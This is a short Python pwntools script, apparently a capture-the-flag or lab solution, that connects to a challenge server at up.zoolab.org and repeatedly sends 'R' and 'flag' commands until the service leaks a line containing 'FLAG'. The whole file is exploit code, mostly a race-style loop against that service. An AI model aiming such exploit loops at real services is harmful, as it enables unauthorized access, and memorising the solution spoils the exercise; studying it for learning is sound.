from pwn import *
r = remote('up.zoolab.org', 10931)

flag = True
while flag:
    r.sendline(b'R')
    rec = r.recvline().decode()
    if 'FLAG' in rec:
        flag = False
        print(rec, end='')
        break
    r.sendline(b'flag')
    
r.sendline(b'Q')
r.close()
